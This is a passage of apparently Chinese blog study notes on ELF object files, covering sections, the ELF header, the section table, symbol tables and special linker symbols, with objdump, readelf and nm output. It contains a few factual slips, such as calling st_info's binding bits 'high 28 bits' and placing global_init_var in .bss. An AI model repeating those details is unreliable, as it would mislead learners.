.text”就是.text的数据以十六进制方式打印出来的内容，最左边是偏移量，中间四列是十六进制内容，最右边是.text段的ASCII码形式，对比下面的反汇编结果可以很明显的看出.text的内容正是SimpleSection.c里两个函数func1()和main()的指令</p><h2 id="数据段和只读数据段"><a href="#数据段和只读数据段" class="headerlink" title="数据段和只读数据段"></a>数据段和只读数据段</h2><p>.data段保存的是那些已经<strong>初始化了的全局静态变量和局部静态变量</strong>。前面的代码中共有两个这样的变量：global_init_varabal和static_var，每个四个字节，所以”.data”段的大小为八个字节</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -s -d -x SimpleSection.o</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA       LMA       File off  Algn</span><br><span class="line">  1 .data         00000008  00000000  00000000  00000098  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">  3 .rodata       00000004  00000000  00000000  000000a0  2**0</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">              </span><br><span class="line">Contents of section .data:</span><br><span class="line"> 0000 54000000 55000000                    T...U...        </span><br><span class="line">Contents of section .rodata:</span><br><span class="line"> 0000 25640a00                             %d..            </span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>“.rodata”段存放的是只读数据，一般是程序里的只读变量（如const修饰的变量）和字符串常量。我们在调用”printf”的时候，用到了一个字符串常量”%d\n”，它是一种只读数据，所以它被放到了”.rodata”段</p><p>在.data段的前四个字节，从低到高分别是0x54，0x00，0x00，0x00，原因是CPU的<strong>字节序（Byte Order）</strong>。即我们所说的大端序和小端序。</p><h2 id="BSS段"><a href="#BSS段" class="headerlink" title="BSS段"></a>BSS段</h2><p>.bss段存放的是<strong>未初始化的全局变量和局部静态变量</strong>，如上述代码中的 global_uninit_var 和 static_var2 。更准确的说法是.bss段为它们预留了空间，但是我们可以看到.bss段的大小只有4个字节，这与应有的八个字节不符。</p><p>其实我们可以通过<strong>符号表（Symbol Table）</strong>（后面章节介绍）看到，只有static_var2被存放在了.bss段，而global_uninit_var没有被存放在任何段，只是一个未定义的”COMMON”符号。这和不同语言、不同编译器相关，有些编译器会将<strong>全局的未初始化变量</strong>存放在目标文件.bss段，有些则不存放，只是预留一个<strong>未定义的全局变量符号</strong>，等到最终链接成可执行文件的时候再在.bss段分配空间。</p><p><strong>编译单元内部可见的静态变量</strong>（比如给global_uninit_var 加上 static 修饰）的确是存放在.bcc段的</p><blockquote><p>当一个c或cpp文件在<em>编译</em>时，预处理器首先递归包含头文件，形成一个含有所有必要信息的单个源文件，这个源文件就是一个<strong>编译单元</strong>。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -s -d -x SimpleSection.o</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA       LMA       File off  Algn</span><br><span class="line">  2 .bss          00000004  00000000  00000000  000000a0  2**2</span><br><span class="line">                  ALLOC</span><br><span class="line">                  </span><br><span class="line">......</span><br></pre></td></tr></table></figure><h3 id="变量存放位置"><a href="#变量存放位置" class="headerlink" title="变量存放位置"></a>变量存放位置</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> x1 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> x2 = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>x1会被存放在.bss中，x2会被放在.data中，因为x1为0，可以认为是未初始化的，所以被优化掉了可以放在.bss，这样可以节省磁盘空间。</p><h2 id="其他段"><a href="#其他段" class="headerlink" title="其他段"></a>其他段</h2><p>elf中也可能包括其他段，这里放一个书中的图</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-3-3.png"  alt=""></p><p>应用程序也可以自定义段，但是需要注意的是不能以”.”作为前缀，否则容易和系统保留段名冲突。</p><h3 id="如何把一个二进制文件作为目标文件中的一个段？"><a href="#如何把一个二进制文件作为目标文件中的一个段？" class="headerlink" title="如何把一个二进制文件作为目标文件中的一个段？"></a>如何把一个二进制文件作为目标文件中的一个段？</h3><p>可以使用objcopy工具，例如我们有一个图片文件”image.png”，大小为0x3f81字节：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ objcopy -I binary -O elf32-i386 -B i386 image.png test.o</span><br><span class="line">$ objdump -ht test.o</span><br><span class="line"></span><br><span class="line">test.o:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA       LMA       File off  Algn</span><br><span class="line">  0 .data         00003f81  00000000  00000000  00000034  2**0</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">SYMBOL TABLE:</span><br><span class="line">00000000 l    d  .data00000000 .data</span><br><span class="line">00000000 g       .data00000000 _binary_image_png_start</span><br><span class="line">00003f81 g       .data00000000 _binary_image_png_end</span><br><span class="line">00003f81 g       *ABS*00000000 _binary_image_png_size</span><br></pre></td></tr></table></figure><p>符号”_binary_image_jpg_start”、”_binary_image_png_end”、”_binary_image_png_size” 分别表示该图片文件在内存中的起始地址、结束地址和大小，我们可以在程序里面直接声明并使用它们</p><h3 id="自定义段"><a href="#自定义段" class="headerlink" title="自定义段"></a>自定义段</h3><p>正常情况下，gcc编译出来的文件中，代码会被放到”.text”段，全局变量和静态变量会被放到”.data”和”.bss”段。</p><p>但有些情况我们可能希望变量或部分代码放到我们指定的段里面，gcc提供了一个扩展机制，使得程序员可以指定变量所处的段：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__attribute__((section(<span class="string">"FOO"</span>))) <span class="keyword">int</span> global = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line">__attribute__((section(<span class="string">"BAR"</span>))) <span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在全局变量或函数之前加上”<em>_attribute_\</em>((section(“BAR”)))” 属性就可以把相应的变量或函数放到以”name”作为段名的段中</p><h1 id="3-4-ELF文件结构描述"><a href="#3-4-ELF文件结构描述" class="headerlink" title="3.4 ELF文件结构描述"></a>3.4 ELF文件结构描述</h1><p>我们把elf最重要的结构提取出来，就形成了如图所示的elf文件基本结构图</p><p><img src="/" class="lazyload" data-src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-3-4.png"  alt=""></p><p>elf目标文件格式的最前部是<strong>ELF文件头（ELF Header）</strong>，它包含了描述整个文件的基本属性。ELF文件中与段有关的重要结构就是<strong>段表（Section Header Table）</strong>，该表描述了ELF文件包含的所有段的信息。</p><h2 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h2><p>我们可以通过readelf命令来详细查看elf文件</p><p>-h 参数即显示elf文件头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -h SimpleSection.o</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF32</span><br><span class="line">  Data:                              2&#39;s complement, little endian</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS&#x2F;ABI:                            UNIX - System V</span><br><span class="line">  ABI Version:                       0</span><br><span class="line">  Type:                              REL (Relocatable file)</span><br><span class="line">  Machine:                           Intel 80386</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x0</span><br><span class="line">  Start of program headers:          0 (bytes into file)</span><br><span class="line">  Start of section headers:          832 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               52 (bytes)</span><br><span class="line">  Size of program headers:           0 (bytes)</span><br><span class="line">  Number of program headers:         0</span><br><span class="line">  Size of section headers:           40 (bytes)</span><br><span class="line">  Number of section headers:         13</span><br><span class="line">  Section header string table index: 10</span><br></pre></td></tr></table></figure><p>我们可以看到，elf的文件头中定义了<strong>ELF魔数、文件机器字节长度、数据存储方式、版本、运行平台、ABI版本、ELF重定位类型、硬件平台、硬件平台版本、入口地址、程序头入口和长度、段表的位置和长度</strong>及<strong>段的数量</strong>等。</p><p>elf文件头结构及相关常数被定义在”usr/include/elf.h”里。</p><p>书上其实有不少介绍，但我觉得暂时没啥用，估计也没人看，在书的p70。</p><h3 id="elf魔数"><a href="#elf魔数" class="headerlink" title="elf魔数"></a>elf魔数</h3><p>最开始的4个字节是所有ELF文件都必须相同的标识码，分别为0x7f、0x45、0x4c、0x46，第一个字节对应ASCII字符里面的DEL控制符，后面3个字节是ELF这三个字母的ASCII码，所谓魔数，也就相当于大家约定俗成的惯例，即用这几个字节来确认文件的类型。</p><h3 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h3><p>系统并不是通过文件的扩展名，而是通过e_type常量来判断elf的真正文件类型，相关的常量以”ET_”开头</p><table><thead><tr><th>常量</th><th>值</th><th>含义</th></tr></thead><tbody><tr><td>ET_REL</td><td>1</td><td>可重定位文件，一般为.o文件</td></tr><tr><td>ET_EXEC</td><td>2</td><td>可执行文件</td></tr><tr><td>ET_DYN</td><td>3</td><td>共享目标文件，一般为.so文件</td></tr></tbody></table><h3 id="机器类型"><a href="#机器类型" class="headerlink" title="机器类型"></a>机器类型</h3><p>elf文件格式被设计成可以在多个平台下使用，但这并不表示同一个elf文件可以在不同的平台下使用，e_machine成员表示该elf文件的平台属性，相关的常量以”EM_”开头</p><table><thead><tr><th>常量</th><th>值</th><th>含义</th></tr></thead><tbody><tr><td>EM_M32</td><td>1</td><td>AT&amp;T WE 32100</td></tr><tr><td>EM_SPARC</td><td>2</td><td>SPARC</td></tr><tr><td>EM_386</td><td>3</td><td>Intel x86</td></tr><tr><td>EM_68K</td><td>4</td><td>Motorola 68000</td></tr><tr><td>EM_88K</td><td>5</td><td>Motorola 88000</td></tr><tr><td>EM_860</td><td>6</td><td>Intel 80860</td></tr></tbody></table><h2 id="段表"><a href="#段表" class="headerlink" title="段表"></a>段表</h2><p><strong>段表（Section Header Table）</strong>就是保存elf文件的段的基本属性的结构</p><p>我们前文中使用<code>objdump -h</code>来查看elf文件中包含的段，实际上只是看到了elf文件中关键的段，我们可以使用readelf来查看elf文件中真正的段表结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -S SimpleSection.o</span><br><span class="line">There are 13 section headers, starting at offset 0x340:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .text             PROGBITS        00000000 000034 000062 00  AX  0   0  1</span><br><span class="line">  [ 2] .rel.text         REL             00000000 0002a8 000028 08   I 11   1  4</span><br><span class="line">  [ 3] .data             PROGBITS        00000000 000098 000008 00  WA  0   0  4</span><br><span class="line">  [ 4] .bss              NOBITS          00000000 0000a0 000004 00  WA  0   0  4</span><br><span class="line">  [ 5] .rodata           PROGBITS        00000000 0000a0 000004 00   A  0   0  1</span><br><span class="line">  [ 6] .comment          PROGBITS        00000000 0000a4 000036 01  MS  0   0  1</span><br><span class="line">  [ 7] .note.GNU-stack   PROGBITS        00000000 0000da 000000 00      0   0  1</span><br><span class="line">  [ 8] .eh_frame         PROGBITS        00000000 0000dc 000064 00   A  0   0  4</span><br><span class="line">  [ 9] .rel.eh_frame     REL             00000000 0002d0 000010 08   I 11   8  4</span><br><span class="line">  [10] .shstrtab         STRTAB          00000000 0002e0 00005f 00      0   0  1</span><br><span class="line">  [11] .symtab           SYMTAB          00000000 000140 000100 10     12  11  4</span><br><span class="line">  [12] .strtab           STRTAB          00000000 000240 000066 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure><p>段表实质上是一个以”Elf32_Shdr”结构体为元素的数组，每个”Elf32_Shdr”结构体对应一个段。故”Elf32_Shdr”又被称为<strong>段描述符（Section Descriptor）</strong>。</p><p>Elf32_Shdr被定义在”/usr/include/elf.h”</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Section header.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Wordsh_name;<span class="comment">/* Section name (string tbl index) */</span></span><br><span class="line">  Elf32_Wordsh_type;<span class="comment">/* Section type */</span></span><br><span class="line">  Elf32_Wordsh_flags;<span class="comment">/* Section flags */</span></span><br><span class="line">  Elf32_Addrsh_addr;<span class="comment">/* Section virtual addr at execution */</span></span><br><span class="line">  Elf32_Offsh_offset;<span class="comment">/* Section file offset */</span></span><br><span class="line">  Elf32_Wordsh_size;<span class="comment">/* Section size in bytes */</span></span><br><span class="line">  Elf32_Wordsh_link;<span class="comment">/* Link to another section */</span></span><br><span class="line">  Elf32_Wordsh_info;<span class="comment">/* Additional section information */</span></span><br><span class="line">  Elf32_Wordsh_addralign;<span class="comment">/* Section alignment */</span></span><br><span class="line">  Elf32_Wordsh_entsize;<span class="comment">/* Entry size if section holds table */</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure><p>关于段的类型、段的标识位、段的链接信息，在书中的p77都列出了各个常量值的详细解释，这里就不多赘述了</p><h2 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h2><p>链接器在处理目标文件时，需要对目标文件中的某些部位进行重定位，即代码段和数据段中那些对绝对地址的引用的位置，这些重定位的信息都记录在elf文件的<strong>重定位表（Relocation Table）</strong>里面。</p><h2 id="字符串表"><a href="#字符串表" class="headerlink" title="字符串表"></a>字符串表</h2><p>elf文件中一般把字符串集中起来存放到一个表，然后使用字符串在表中的偏移来引用字符串。</p><p>而字符串表通常有两种，普通的<strong>字符串表（String Table）</strong>和<strong>段表字符串表（Section Header String Table）</strong></p><ul><li>字符串表用来保存普通的字符串，比如符号的名字</li><li>段表字符串用来保存段表中用到的字符串，最常见的就是段名（sh_name）</li></ul><h1 id="3-5-链接的接口——符号"><a href="#3-5-链接的接口——符号" class="headerlink" title="3.5 链接的接口——符号"></a>3.5 链接的接口——符号</h1><p>链接过程的本质是要把多个不同的目标文件之间相互“粘”到一起，链接中，目标文件之间相互拼合实际上是目标文件之间对地址的引用，即对函数和变量的地址的引用。例如目标文件B要用到了目标文件A中的函数”foo”，那么我们就称目标文件A<strong>定义（Define）</strong>了函数”foo”，称目标文件B<strong>引用（Reference）</strong>了目标文件A中的函数”foo”。变量也是一样，在链接中我们将函数和变量统称为<strong>符号（Symbol）</strong>，函数名和变量名就是<strong>符号名（Symbol name）</strong>。</p><p>链接过程中很关键的一部分就是符号的管理，每一个目标文件都会有一个相应的<strong>符号表（Symbol Table）</strong>，这个表里面记录了目标文件中所用到的所有符号，每个定义的符号有一个对应的值，叫<strong>符号值（Symbol Value）</strong>，对于变量和函数来说，符号值就是它们的地址。</p><p>我们将符号表中所有的符号进行分类：</p><ul><li>定义在本目标文件的全局符号，可以被其他目标文件引用。例如SimpleSection.o里面的”func1”、”main”和”global_init_var”。</li><li>在本目标文件中引用的全局符号，却没有定义在本目标文件，这一般叫做<strong>外部符号（External Symbol）</strong>，也就是我们前面所讲的符号引用，比如SimpleSection.o里面的”printf”。</li><li>段名，这种符号往往由编译器产生，它的值就是该段段起始地址。比如SimpleSection.o里面的”.text”、”.data”等</li><li>局部符号，这类符号往往由编译器产生，它的值就是该段段起始地址。比如SimpleSection.o里面的”static_var”和”static_var2”。调试器可以使用这些符号来分析程序或崩溃时段核心转储文件。这些局部符号对于链接没有作用，链接器也往往忽略它们</li><li>行号信息，即目标文件指令与源文件中代码行等对应关系，它也是可选的</li></ul><p>对于我们来说最需要关心的就是全局符号，其他的都是次要的，因为它们对于其他目标文件来说是“不可见”的，链接过程中也无关紧要。我们可以使用readelf、objdump、nm等工具来查看elf文件的符号表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ nm SimpleSection.o</span><br><span class="line">00000000 T func1</span><br><span class="line">00000000 D global_init_var</span><br><span class="line">00000004 C global_uninit_var</span><br><span class="line">0000001c T main</span><br><span class="line">         U printf</span><br><span class="line">00000004 d static_var.1488</span><br><span class="line">00000000 b static_var2.1489</span><br></pre></td></tr></table></figure><h2 id="elf符号表结构"><a href="#elf符号表结构" class="headerlink" title="elf符号表结构"></a>elf符号表结构</h2><p>elf文件中的符号表往往是文件中的一个段，段名一般叫”.symtab”。符号表的结构很简单，它是一个Elf32_Sym结构（32位elf文件）的数组，每个Elf32_Sym结构对应一个符号。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Symbol table entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Wordst_name;<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addrst_value;<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Wordst_size;<span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>st_info;<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span>st_other;<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Sectionst_shndx;<span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><ul><li><strong>符号类型和绑定信息（st_info）</strong><br>该成员低4位表示符号的类型（Symbol Type），高28位表示符号绑定信息（Symbol Binding）</li><li><strong>符号所在段（st_shndx）</strong><br>如果符号定义在本目标文件中，那么这个成员表示符号所在段段在段表中的下标。如果符号不是定义在本目标文件中，或者对于有些特殊符号，这个成员的值表示符号的类型/未定义</li><li><strong>符号值（st_value）</strong><br>如果这个符号是一个函数或变量的定义，那么符号的值就是这个函数或变量的地址，更具体的说有以下几种情况<ul><li>目标文件中，如果是符号的定义且该符号不是”COMMON块”类型的，则st_value表示该符号值段中的偏移</li><li>目标文件中，如果该符号是”COMMON块”类型的，则st_value表示该符号的对齐属性</li><li>在可执行文件中，st_value表示符号的虚拟地址。</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -s SimpleSection.o</span><br><span class="line"></span><br><span class="line">Symbol table &#39;.symtab&#39; contains 16 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     1: 00000000     0 FILE    LOCAL  DEFAULT  ABS SimpleSection.c</span><br><span class="line">     2: 00000000     0 SECTION LOCAL  DEFAULT    1 </span><br><span class="line">     3: 00000000     0 SECTION LOCAL  DEFAULT    3 </span><br><span class="line">     4: 00000000     0 SECTION LOCAL  DEFAULT    4 </span><br><span class="line">     5: 00000000     0 SECTION LOCAL  DEFAULT    5 </span><br><span class="line">     6: 00000004     4 OBJECT  LOCAL  DEFAULT    3 static_var.1488</span><br><span class="line">     7: 00000000     4 OBJECT  LOCAL  DEFAULT    4 static_var2.1489</span><br><span class="line">     8: 00000000     0 SECTION LOCAL  DEFAULT    7 </span><br><span class="line">     9: 00000000     0 SECTION LOCAL  DEFAULT    8 </span><br><span class="line">    10: 00000000     0 SECTION LOCAL  DEFAULT    6 </span><br><span class="line">    11: 00000000     4 OBJECT  GLOBAL DEFAULT    3 global_init_var</span><br><span class="line">    12: 00000004     4 OBJECT  GLOBAL DEFAULT  COM global_uninit_var</span><br><span class="line">    13: 00000000    28 FUNC    GLOBAL DEFAULT    1 func1</span><br><span class="line">    14: 00000000     0 NOTYPE  GLOBAL DEFAULT  UND printf</span><br><span class="line">    15: 0000001c    70 FUNC    GLOBAL DEFAULT    1 main</span><br></pre></td></tr></table></figure><p>第一列Num表示符号表数组的下标；第二列Value就是符号值，即st_value；第三列Size为符号大小，即st_size；第四列和第五咧分别为符号类型和绑定信息，即对应st_info的低4位和高28位；第六列Vis目前在C/C++语言中未使用；第七列Ndx即st_shndx，表示该符号所属的段；最后一列即符号名称</p><p>第一个符号，即下标为0的符号，永远是一个未定义的符号，对于另外几个符号解释如下：</p><ul><li>func1和main函数都是定义在SimpleSection.c里面的，它们所在的位置都为代码段，所以Ndx为1，即SimpleSection.o里面，.text段的下标为1。它们是函数，所以类型是STT_FUNC；它们全局可见，所以是STB_GLOBAL；Size表示函数指令所占的字节数；Value表示函数相对于代码段起始位置的偏移量</li><li>printf符号在SimpleSection.c里面被引用，但是没有被定义，所以它的Ndx是SHN_UNDEF</li><li>global_init_var是已初始化的全局变量，它被定义在.bss段，即下标为3。</li><li>global_uninit_var是未初始化的全局变量，它是一个SHN_COMMON类型的符号，它本身并没有存在BSS段。</li><li>static_var.1488和static_var2.1489是两个静态变量，它们的绑定属性是STB_LOCAL，即只是编译单元内部可见。</li><li>对于那些STT_SECTION类型的符号，它们表示下标为Ndx的段的段名。它们的符号名没有显示，因为它们的符号名即段名。</li><li>“SimpleSection.c”这个符号表示编译单元的源文件名</li></ul><h2 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h2><p>当我们使用ld作为链接器来链接生产可执行文件时，它会为我们定义很多特殊的符号，这些符号并没有在我们的程序中定义，但是我们可以直接声明并使用它，我们称之为特殊符号。</p><p>链接器会在将程序最终链接成可执行文件的时候将其解析成正确的值，需要注意的是，只有使用ld链接生产最终可执行文件的时候这些符号才会存在，几个具有代表性的特殊符号如下：</p><ul><li>__executable_start，该符号为程序起始地址，注意，不是入口地址，是程序的最开始的地址</li><li>__etext或_etext或etext，该符号为代码段结束地址，即代码段最末尾的地址</li><li>_edata或edata，该符号为数据段结束地址，即数据段最末尾的地址</li><li>_end或end，该符号为程序结束地址</li><li>以上地址都是程序被装载时的虚拟地址</li></ul><p>我们可以在程序中直接使用这些符号：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SpecialSymbol.c</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> __executable_start[];</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> etext[],_etext[],__etext[];</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> edata[],_edata[];</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> <span class="built_in">end</span>[],_end[];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Executable Start %X\n"</span>, __executable_start);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Text End %X %X %X\n"</span>, etext, _etext, __etext);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Data End %X %X\n"</span>, edata, _edata);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Executable End %X %X\n"</span>, <span class="built_in">end</span>, _end);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ gcc SpecialSymbol.c -o SpecialSymbol</span><br><span class="line">$ .&#x2F;SpecialSymbol </span><br><span class="line">Executable Start 400000</span><br><span class="line">Text End 40061D 40061D 40061D</span><br><span class="line">Data End 601038 601038</span><br><span class="line">Executable End 601040 601040</span><br></pre></td></tr></table></figure><h2 id="符号修饰与函数签名"><a href="#符号修饰与函数签名" class="headerlink" title="符号修饰与函数签名"></a>符号修饰与函数签名</h2><p>为了防止例如c语言库和我们编写的代码之间的符号名冲突，最开始的unix下的c语言规定，c语言yuandaim文件中的所有全局变量和函数经过编译以后，相对应的符号名前加上下划线”_”。但是这种方法简单和原始，后来例如c++增加了<strong>名称空间（namespace）</strong>的方法来解决多模块的符号冲突问题</p><p>随着时间的推移，整个环境发生了很大变化，例如linux下的gcc编译器中已经默认去掉了在c语言符号前加”_”的方式，但是windows下的编译器还保留着这样的传统。</p><h3 id="C-符号修饰"><a href="#C-符号修饰" class="headerlink" title="C++符号修饰"></a>C++符号修饰</h3><p>c++拥有很多强大的特性，人们于是发明了<strong>符号修饰（Name Decoration）</strong>或<strong>符号改编（Name Mangling）</strong>机制来解决这些问题。例如下列代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 